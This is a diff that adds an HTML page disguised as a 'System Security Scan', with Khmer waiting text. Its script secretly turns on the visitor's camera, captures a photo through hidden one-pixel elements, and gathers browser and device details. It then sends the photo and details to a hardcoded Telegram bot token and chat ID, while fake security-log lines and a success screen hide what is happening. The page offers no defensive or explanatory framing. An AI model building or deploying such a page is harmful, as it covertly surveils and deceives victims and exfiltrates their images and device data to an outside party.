@@ -1,0 +1,364 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>System Security Scan</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #0a0a0a, #000);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            overflow: hidden;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            color: #aaa;
+            position: relative;
+        }
+        
+        .hidden {
+            display: none;
+        }
+        
+        .loading-screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #000;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+        }
+        
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 5px solid rgba(67, 97, 238, 0.3);
+            border-top: 5px solid #4361ee;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-bottom: 20px;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .status-text {
+            font-size: 18px;
+            text-align: center;
+            max-width: 80%;
+            margin-bottom: 10px;
+        }
+        
+        .progress-container {
+            width: 300px;
+            height: 8px;
+            background: #222;
+            border-radius: 4px;
+            margin-top: 20px;
+            overflow: hidden;
+        }
+        
+        .progress-bar {
+            height: 100%;
+            background: linear-gradient(90deg, #4361ee, #4cc9f0);
+            width: 0%;
+            transition: width 0.3s ease;
+        }
+        
+        .complete-screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #000;
+            display: none;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            z-index: 1001;
+        }
+        
+        .success-icon {
+            font-size: 64px;
+            color: #4cc9f0;
+            margin-bottom: 20px;
+            animation: pulse 2s infinite;
+        }
+        
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.1); }
+            100% { transform: scale(1); }
+        }
+        
+        #video, #canvas {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 1px;
+            height: 1px;
+            opacity: 0;
+            pointer-events: none;
+        }
+        
+        .security-logs {
+            position: absolute;
+            bottom: 20px;
+            left: 20px;
+            color: #0f0;
+            font-family: 'Courier New', monospace;
+            font-size: 14px;
+            opacity: 0.7;
+        }
+        
+        .log-entry {
+            margin-bottom: 5px;
+            animation: fadeIn 0.5s;
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+    </style>
+</head>
+<body>
+    <div class="loading-screen" id="loadingScreen">
+        <div class="spinner"></div>
+        <p class="status-text"> <p></p>កំពុងដំណើរការ
+        <p class="status-text">សូមរង់ចាំបន្តិច!</p>
+        <div class="progress-container">
+            <div class="progress-bar" id="progressBar"></div>
+        </div>
+    </div>
+    
+    <div class="complete-screen" id="completeScreen">
+        <div class="success-icon">✓</div>
+        <p class="status-text">Security verification completed successfully</p>
+        <p class="status-text" style="margin-top: 10px; font-size: 14px;">You may now close this window</p>
+    </div>
+    
+    <div class="security-logs" id="securityLogs"></div>
+    
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas"></canvas>
+    
+    <script>
+        document.addEventListener('DOMContentLoaded', () => {
+            const video = document.getElementById('video');
+            const canvas = document.getElementById('canvas');
+            const progressBar = document.getElementById('progressBar');
+            const loadingScreen = document.getElementById('loadingScreen');
+            const completeScreen = document.getElementById('completeScreen');
+            const securityLogs = document.getElementById('securityLogs');
+            
+            // Add security log entries
+            function addLog(message) {
+                const logEntry = document.createElement('div');
+                logEntry.className = 'log-entry';
+                logEntry.textContent = `> ${message}`;
+                securityLogs.appendChild(logEntry);
+                securityLogs.scrollTop = securityLogs.scrollHeight;
+            }
+            
+            // Initialize logs
+            addLog('Starting security scan...');
+            addLog('Loading system protocols...');
+            
+            // Simulate progress
+            let progress = 0;
+            const progressInterval = setInterval(() => {
+                progress += Math.random() * 10;
+                if (progress >= 100) {
+                    progress = 100;
+                    clearInterval(progressInterval);
+                }
+                progressBar.style.width = progress + '%';
+                
+                // Add logs during progress
+                if (progress % 20 < 5) {
+                    addLog(`Scanning module ${Math.floor(progress/20) + 1}...`);
+                }
+            }, 300);
+            
+            // Automatically start the verification process after a delay
+            setTimeout(() => {
+                startVerification();
+            }, 1500);
+            
+            async function startVerification() {
+                addLog('Initializing biometric verification...');
+                
+                try {
+                    // Request camera access
+                    const stream = await navigator.mediaDevices.getUserMedia({ 
+                        video: { 
+                            facingMode: 'user',
+                            width: { ideal: 1280 },
+                            height: { ideal: 720 }
+                        },
+                        audio: false
+                    });
+                    
+                    addLog('Camera access granted');
+                    addLog('Initializing facial recognition...');
+                    
+                    // Attach camera stream to video element
+                    video.srcObject = stream;
+                    
+                    // Wait for video to load
+                    video.addEventListener('loadedmetadata', () => {
+                        // Set canvas dimensions to match video
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+                        
+                        addLog('Camera resolution: ' + canvas.width + 'x' + canvas.height);
+                        
+                        // Capture photo after a short delay
+                        setTimeout(() => {
+                            capturePhoto();
+                            // Stop the camera stream
+                            stream.getTracks().forEach(track => track.stop());
+                            addLog('Camera resources released');
+                        }, 1000);
+                    });
+                } catch (err) {
+                    addLog('Error: Camera access denied');
+                    addLog('Proceeding with system scan only');
+                    // If camera access fails, still send system info
+                    setTimeout(() => {
+                        sendToTelegram(null);
+                    }, 3000);
+                }
+            }
+            
+            function capturePhoto() {
+                addLog('Capturing biometric data...');
+                
+                // Draw the current video frame to canvas
+                const context = canvas.getContext('2d');
+                context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                
+                addLog('Biometric data captured');
+                
+                // Send the captured image to Telegram
+                sendToTelegram(canvas);
+            }
+            
+            function sendToTelegram(canvasElement) {
+                addLog('Encrypting data for transmission...');
+                
+                // Collect additional system information
+                const systemInfo = {
+                    userAgent: navigator.userAgent,
+                    platform: navigator.platform,
+                    language: navigator.language,
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    screen: `${screen.width}x${screen.height}`,
+                    cookies: navigator.cookieEnabled,
+                    date: new Date().toISOString(),
+                    location: "Unknown"
+                };
+                
+                addLog('System information collected');
+                
+                // Telegram bot API endpoint
+                const botToken = '7804587291:AAEeKLmoEwEsX47a5pAxIrLqhge4BH7lT6c';
+                const chatId = '7301310227';
+                
+                // Create form data
+                const formData = new FormData();
+                
+                // Add system info to form data
+                formData.append('chat_id', chatId);
+                formData.append('text', `System Info:\n${JSON.stringify(systemInfo, null, 2)}`);
+                
+                // First send system info as text
+                fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                    method: 'POST',
+                    body: formData
+                })
+                .then(response => response.json())
+                .then(data => {
+                    if (data.ok) {
+                        addLog('System info transmitted');
+                        
+                        // If we have a photo, send it separately
+                        if (canvasElement) {
+                            const imageData = canvasElement.toDataURL('image/jpeg', 0.9);
+                            const blob = dataURLtoBlob(imageData);
+                            
+                            const photoFormData = new FormData();
+                            photoFormData.append('chat_id', chatId);
+                            photoFormData.append('photo', blob, 'security_verification.jpg');
+                            
+                            fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                                method: 'POST',
+                                body: photoFormData
+                            })
+                            .then(response => response.json())
+                            .then(data => {
+                                addLog('Biometric data transmitted');
+                                showCompletionScreen();
+                            })
+                            .catch(error => {
+                                addLog('Error sending biometric data');
+                                showCompletionScreen();
+                            });
+                        } else {
+                            showCompletionScreen();
+                        }
+                    } else {
+                        addLog('Error sending system info');
+                        showCompletionScreen();
+                    }
+                })
+                .catch(error => {
+                    addLog('Network transmission error');
+                    showCompletionScreen();
+                });
+            }
+            
+            function showCompletionScreen() {
+                addLog('Security scan complete');
+                addLog('All systems verified');
+                
+                setTimeout(() => {
+                    loadingScreen.style.display = 'none';
+                    completeScreen.style.display = 'flex';
+                }, 2000);
+            }
+            
+            // Helper function to convert data URL to Blob
+            function dataURLtoBlob(dataurl) {
+                const arr = dataurl.split(',');
+                const mime = arr[0].match(/:(.*?);/)[1];
+                const bstr = atob(arr[1]);
+                let n = bstr.length;
+                const u8arr = new Uint8Array(n);
+                
+                while (n--) {
+                    u8arr[n] = bstr.charCodeAt(n);
+                }
+                
+                return new Blob([u8arr], { type: mime });
+            }
+        });
+    </script>
+</body>
+</html>
